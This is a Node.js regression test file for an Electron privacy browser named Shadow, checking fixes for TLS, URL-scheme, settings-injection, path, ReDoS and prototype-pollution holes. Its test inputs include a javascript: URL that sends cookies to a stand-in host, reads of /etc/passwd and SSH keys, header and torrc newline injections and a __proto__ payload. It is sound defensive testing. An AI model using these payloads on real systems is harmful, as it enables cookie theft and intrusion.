'use strict';
/**
 * Regression tests for vulnerabilities found in Shadow's own code.
 *
 * Each test names the hole it closes. If one of these ever fails again, a
 * protection has been silently removed, not merely refactored.
 */

const { test } = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const { isNavigable, isSafeExternal, isInternalPage, assertNavigable } = require('../src/main/hardening/url-policy');
const { checkReleaseDir } = require('../src/main/hardening/safe-paths');
const { validateSetting } = require('../src/main/storage/setting-validators');
const { SettingsStore } = require('../src/main/storage/store');
const { normalizeAddress } = require('../src/main/ipc');
const { Analyzer } = require('../src/main/soc/analyzer');
const { Blocklists } = require('../src/main/firewall/blocklists');

// ---------------------------------------------------------------------------
// C1: setCertificateVerifyProc(callback(0)) trusted every certificate.
// In Electron, 0 means "success", not "use Chromium's result" (-3). Returning
// 0 accepts expired, self-signed, revoked and wrong-hostname certificates,
// which defeats HTTPS entirely.
// ---------------------------------------------------------------------------
test('C1: TLS verification defers to Chromium and never forces success', () => {
  const src = fs.readFileSync(path.join(__dirname, '..', 'src', 'main', 'hardening', 'profile.js'), 'utf8');
  const proc = src.slice(src.indexOf('setCertificateVerifyProc'));
  const body = proc.slice(0, proc.indexOf('});'))
    // Strip comments: the warning above the call names callback(0) in prose,
    // and this test is about what the code does, not what it explains.
    .replace(/\/\*[\s\S]*?\*\//g, ' ')
    .replace(/\/\/[^\n]*/g, ' ');

  const calls = [...body.matchAll(/callback\(\s*(-?\d+)\s*\)/g)].map((m) => m[1]);
  assert.deepEqual(calls, ['-3'],
    'the only certificate verification result may be -3 (use Chromium). 0 means "trust it".');
});

// ---------------------------------------------------------------------------
// C2: tor.binaryPath was a plain string handed to spawn(). The settings API is
// reachable from the browser UI, which is a renderer, so this turned a
// renderer compromise into arbitrary code execution.
// ---------------------------------------------------------------------------
test('C2: an arbitrary executable cannot be set as the Tor binary', () => {
  for (const bad of ['/bin/sh', '/usr/bin/curl', '/tmp/payload', 'C:\\Windows\\System32\\cmd.exe']) {
    assert.throws(() => validateSetting('tor.binaryPath', bad), /refused/, bad);
  }
  assert.doesNotThrow(() => validateSetting('tor.binaryPath', ''), 'empty means auto-detect');
});

test('C2: torrc bridge lines cannot inject extra directives', () => {
  assert.throws(
    () => validateSetting('tor.bridges', ['obfs4 1.2.3.4:80 CERT=x\nControlPort 0.0.0.0:9999']),
    /newline/);
  assert.doesNotThrow(() => validateSetting('tor.bridges', ['obfs4 1.2.3.4:80 CERT=abc/def+gh iat-mode=0']));
});

test('C2: a User-Agent cannot carry a header injection', () => {
  assert.throws(() => validateSetting('hardening.userAgent', 'X\r\nX-Injected: yes'), /newline/);
});

// ---------------------------------------------------------------------------
// C3: privileged handlers took a URL string and called loadURL() on it, so a
// renderer could read local files or run script in a privileged origin.
// ---------------------------------------------------------------------------
test('C3: only http and https may be navigated to', () => {
  for (const good of ['https://example.com/x', 'http://example.com/', 'about:blank']) {
    assert.equal(isNavigable(good), true, good);
  }
  for (const bad of [
    'file:///etc/passwd',
    'file:///home/user/.ssh/id_rsa',
    'javascript:fetch("//evil.tk?c="+document.cookie)',
    'data:text/html,<script>alert(1)</script>',
    'blob:https://example.com/abc',
    'view-source:https://example.com',
    'chrome://settings',
    'devtools://devtools/bundled/inspector.html',
    'smb://server/share',
    'ms-msdt:/id PCWDiagnostic',
    'search-ms:query=x',
  ]) {
    assert.equal(isNavigable(bad), false, `${bad} must be refused`);
  }
});

test('C3: assertNavigable throws with a code the IPC layer can report', () => {
  assert.throws(() => assertNavigable('file:///etc/passwd'), (err) => err.code === 'URL_REFUSED');
});

test('C3: Shadow internal pages are identified by real path, not by spelling', () => {
  const rendererDir = path.join(__dirname, '..', 'src', 'renderer');
  const real = `file://${path.join(rendererDir, 'interstitial.html')}`;
  assert.equal(isInternalPage(real, rendererDir), true);

  // A file merely named the same, somewhere else, is not internal.
  assert.equal(isInternalPage('file:///tmp/evil/interstitial.html', rendererDir), false);
  // Nor is a traversal that resolves outside the directory.
  assert.equal(isInternalPage(`file://${rendererDir}/../../../tmp/interstitial.html`, rendererDir), false);
  // Nor an arbitrary file inside it.
  assert.equal(isInternalPage(`file://${path.join(rendererDir, 'app.js')}`, rendererDir), false);
});

// ---------------------------------------------------------------------------
// C4: shell.openExternal was called with an unvalidated scheme, which is how a
// web page gets another program on the machine to run.
// ---------------------------------------------------------------------------
test('C4: only web and mail links are handed to the operating system', () => {
  assert.equal(isSafeExternal('https://example.com'), true);
  assert.equal(isSafeExternal('mailto:a@b.com'), true);
  for (const bad of ['file:///etc/passwd', 'ms-msdt:/id', 'smb://x/y', 'javascript:alert(1)', 'vscode://x']) {
    assert.equal(isSafeExternal(bad), false, bad);
  }
});

// ---------------------------------------------------------------------------
// H4: sandbox.releaseDir is a user setting, so a compromised UI could point it
// at an autostart directory and release a file into persistence.
// ---------------------------------------------------------------------------
test('H4: downloads cannot be released into directories that run things', () => {
  const home = os.homedir();
  assert.equal(checkReleaseDir(path.join(home, 'Downloads')).ok, true);
  assert.equal(checkReleaseDir(path.join(home, 'Documents', 'work')).ok, true);

  for (const bad of [
    path.join(home, '.config', 'autostart'),
    path.join(home, '.local', 'share', 'systemd', 'user'),
    path.join(home, 'Library', 'LaunchAgents'),
    path.join(home, '.ssh'),
    path.join(home, '.bashrc'),
    '/etc/cron.d',
    '/usr/bin',
    '/',
    '/tmp/elsewhere',
  ]) {
    assert.equal(checkReleaseDir(bad).ok, false, `${bad} must be refused`);
  }
});

test('H4: the release directory setting is refused at the store level', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'shadow-rel-'));
  const store = new SettingsStore({ file: path.join(dir, 's.json') });
  assert.throws(() => store.set('sandbox.releaseDir', path.join(os.homedir(), '.config', 'autostart')), /refused/);
  assert.doesNotThrow(() => store.set('sandbox.releaseDir', path.join(os.homedir(), 'Downloads')));
  fs.rmSync(dir, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// A settings file on disk must not be able to smuggle in a value that set()
// would have rejected.
// ---------------------------------------------------------------------------
test('a tampered settings file cannot bypass the content checks', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'shadow-tamper-'));
  const file = path.join(dir, 'settings.json');
  fs.writeFileSync(file, JSON.stringify({
    'tor.binaryPath': '/bin/sh',
    'privacy.searchEngine': 'file:///etc/passwd?q=%s',
    'sandbox.releaseDir': path.join(os.homedir(), '.config', 'autostart'),
    'proxy.url': 'http://attacker.example:8080/;evil',
    'soc.mode': 'strict',
  }));
  const store = new SettingsStore({ file });

  assert.equal(store.get('tor.binaryPath'), '', 'must fall back to the default');
  assert.equal(store.get('privacy.searchEngine'), 'https://duckduckgo.com/?q=%s');
  assert.equal(store.get('sandbox.releaseDir'), '');
  assert.equal(store.get('proxy.url'), '');
  assert.equal(store.get('soc.mode'), 'strict', 'valid values must still load');
  fs.rmSync(dir, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// The address bar must not open a dangerous scheme, however it is typed.
// ---------------------------------------------------------------------------
test('the address bar turns a refused scheme into a search, not a load', () => {
  const settings = { get: () => 'https://duckduckgo.com/?q=%s' };
  for (const bad of ['file:///etc/passwd', 'data:text/html,x', 'chrome://settings']) {
    const out = normalizeAddress(bad, settings);
    assert.ok(out.startsWith('https://duckduckgo.com/'), `${bad} became ${out}`);
  }
  assert.equal(normalizeAddress('https://example.com/a', settings), 'https://example.com/a');
  assert.equal(normalizeAddress('example.com', settings), 'https://example.com');
});

test('a malformed search-engine template falls back rather than breaking', () => {
  const settings = { get: () => 'not a template' };
  assert.ok(normalizeAddress('hello world', settings).startsWith('https://duckduckgo.com/'));
});

// ---------------------------------------------------------------------------
// M1: a firewall rule pattern is compiled against every request, so a
// catastrophically backtracking regex would hang the whole browser.
// ---------------------------------------------------------------------------
test('M1: firewall rule patterns that can hang the browser are refused', () => {
  assert.throws(() => validateSetting('firewall.customRules', [
    { action: 'block', match: { urlPattern: '(a+)+$' } },
  ]), /backtrack|refused/);

  assert.throws(() => validateSetting('firewall.customRules', [
    { action: 'block', match: { urlPattern: 'x'.repeat(300) } },
  ]), /200 characters/);

  assert.throws(() => validateSetting('firewall.customRules', [
    { action: 'block', match: { urlPattern: '[unclosed' } },
  ]), /invalid pattern/);

  assert.doesNotThrow(() => validateSetting('firewall.customRules', [
    { action: 'block', match: { urlPattern: '/ads/.*\\.js$' } },
  ]));
});

test('M1: a rule with no match, or an unknown action, is refused', () => {
  assert.throws(() => validateSetting('firewall.customRules', [{ action: 'block', match: {} }]), /non-empty match/);
  assert.throws(() => validateSetting('firewall.customRules', [{ action: 'exec', match: { host: 'x.com' } }]), /unknown action/);
});

// ---------------------------------------------------------------------------
// M2: unbounded caches let a page grow main-process memory without limit.
// ---------------------------------------------------------------------------
test('M2: the analyst cache and override list are bounded', async () => {
  const settings = { get: (k) => ({ 'soc.mode': 'balanced', 'soc.allowlist': [] }[k]) };
  const analyzer = new Analyzer({ blocklists: new Blocklists({ settings }), settings });
  analyzer.cacheMax = 50;
  analyzer.overrideMax = 10;

  for (let i = 0; i < 500; i++) await analyzer.inspectUrl(`https://host${i}.example.com/`);
  assert.ok(analyzer.cache.size <= 50, `cache grew to ${analyzer.cache.size}`);

  for (let i = 0; i < 100; i++) analyzer.override(`https://x${i}.com/`);
  assert.ok(analyzer.sessionOverrides.size <= 10, `overrides grew to ${analyzer.sessionOverrides.size}`);
});

// ---------------------------------------------------------------------------
// Settings that feed a proxy or DNS must not silently downgrade the transport.
// ---------------------------------------------------------------------------
test('proxy and DNS settings must keep their guarantees', () => {
  assert.throws(() => validateSetting('dns.dohUrl', 'http://dns.example/query'), /https/);
  assert.doesNotThrow(() => validateSetting('dns.dohUrl', 'https://dns.quad9.net/dns-query'));

  assert.throws(() => validateSetting('proxy.url', 'javascript:alert(1)'), /refused/);
  assert.doesNotThrow(() => validateSetting('proxy.url', 'socks5://127.0.0.1:9050'));

  assert.throws(() => validateSetting('privacy.homepage', 'file:///etc/passwd'), /http/);
  assert.doesNotThrow(() => validateSetting('privacy.homepage', 'shadow://home'));
});

test('allowlists cannot be stuffed with non-domains or grown without limit', () => {
  assert.throws(() => validateSetting('soc.allowlist', ['not a domain!']), /is not a domain/);
  assert.throws(() => validateSetting('soc.allowlist', new Array(5000).fill('a.com')), /at most/);
  assert.doesNotThrow(() => validateSetting('soc.allowlist', ['example.com', 'a.b.co.uk']));
});

// ---------------------------------------------------------------------------
// Input validation: `key in DEFAULTS` is true for every inherited
// Object.prototype member, so a naive guard accepts "__proto__",
// "constructor" and "toString" as setting names.
// ---------------------------------------------------------------------------
test('inherited object keys are not accepted as setting names', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'shadow-proto-'));
  const file = path.join(dir, 'settings.json');
  fs.writeFileSync(file, '{"__proto__":{"polluted":"yes"},"constructor":"x","soc.mode":"strict"}');
  const store = new SettingsStore({ file });

  assert.equal(Object.getPrototypeOf(store.values), null, 'settings must have no prototype to override');
  assert.equal(store.get('polluted'), undefined);
  assert.equal(({}).polluted, undefined, 'nothing may reach Object.prototype');
  assert.equal(store.get('soc.mode'), 'strict', 'real settings must still load');

  for (const key of ['__proto__', 'constructor', 'toString', 'valueOf', 'hasOwnProperty']) {
    assert.throws(() => store.set(key, 'x'), /unknown setting/, key);
  }
  fs.rmSync(dir, { recursive: true, force: true });
});

test('the validator lookup does not resolve inherited properties', () => {
  // VALIDATORS['constructor'] would otherwise be Object, and calling it as a
  // validator silently accepts the value instead of refusing the key.
  assert.doesNotThrow(() => validateSetting('soc.mode', 'strict'));
  assert.doesNotThrow(() => validateSetting('constructor', 'anything'),
    'an inherited key must not throw an internal error; the store rejects it by name');
  assert.doesNotThrow(() => validateSetting('__proto__', {}));
});

// ---------------------------------------------------------------------------
// Shadow's own UI is served from file://, and the file-scheme hardening added
// during the audit blocked its stylesheet and script as "file subresources".
// The block page still appeared, but rendered its static defaults: a score of
// 0 and no findings. A block page that cannot say why it blocked has failed at
// the only job it has.
// ---------------------------------------------------------------------------
test("the firewall does not block Shadow's own page assets", () => {
  const { decideRequest, parseRequest } = require('../src/main/firewall/firewall');
  const { isInternalAsset } = require('../src/main/hardening/url-policy');
  const rendererDir = path.join(__dirname, '..', 'src', 'renderer');

  const settings = { get: (k) => ({ 'firewall.blockPrivateNetwork': true, 'firewall.httpsOnly': true }[k]) };
  const config = {
    settings,
    rules: [],
    isInternalAsset: (u) => isInternalAsset(u, rendererDir),
  };

  for (const asset of ['interstitial.js', 'styles.css', 'app.js']) {
    const url = `file://${path.join(rendererDir, asset)}`;
    const decision = decideRequest(parseRequest({ url, resourceType: 'script' }), config);
    assert.equal(decision.action, 'allow', `${asset} must load: ${decision.detail || decision.reason}`);
  }

  // Everything outside that directory is still refused.
  for (const outside of ['file:///etc/passwd', `file://${path.join(rendererDir, '..', '..', 'package.json')}`]) {
    const decision = decideRequest(parseRequest({ url: outside, resourceType: 'script' }), config);
    assert.equal(decision.action, 'block', `${outside} must stay blocked`);
  }

  // And a web page still cannot send a tab to a local file.
  const nav = decideRequest(
    parseRequest({ url: 'file:///etc/passwd', resourceType: 'mainFrame', referrer: 'https://evil.tk/' }),
    config);
  assert.equal(nav.action, 'block');
});

test('isInternalAsset resolves paths rather than trusting how they are spelled', () => {
  const { isInternalAsset } = require('../src/main/hardening/url-policy');
  const rendererDir = path.join(__dirname, '..', 'src', 'renderer');

  assert.equal(isInternalAsset(`file://${path.join(rendererDir, 'app.js')}`, rendererDir), true);
  assert.equal(isInternalAsset(`file://${rendererDir}/../../../etc/passwd`, rendererDir), false);
  assert.equal(isInternalAsset('file:///tmp/renderer/app.js', rendererDir), false);
  assert.equal(isInternalAsset('https://example.com/app.js', rendererDir), false);
});
